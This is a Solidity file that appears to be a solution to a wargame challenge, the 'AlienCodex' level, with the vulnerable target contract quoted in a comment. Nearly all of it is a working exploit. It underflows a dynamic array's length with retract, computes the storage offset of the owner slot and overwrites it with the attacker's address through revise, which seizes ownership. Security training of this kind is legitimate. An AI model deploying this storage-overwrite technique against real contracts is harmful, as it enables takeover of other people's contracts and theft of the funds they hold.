// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IAlienCodex {
    function owner() external view returns (address);
    function makeContact() external;
    function revise(uint256 i, bytes32 _content) external;
    function retract() external;
}

contract AlienCodexHack {

    constructor(IAlienCodex target) {
        target.makeContact();
        target.retract();

        uint256 h = uint256(keccak256(abi.encode(uint256(1))));
        uint256 i; // defaults to 0

        // Allows for under/overflow
        unchecked {
            i -= h;
        }

        // Call revise function from target, casting msg.sender into bytes32.
        target.revise(i, bytes32(uint256(uint160(msg.sender))));

        // Revert unless the owner is us.
        require(target.owner() == msg.sender, "hack failed");
    }
}


/*
// Target Contract 
// Uses Solidity 0.5.0

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function makeContact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
*/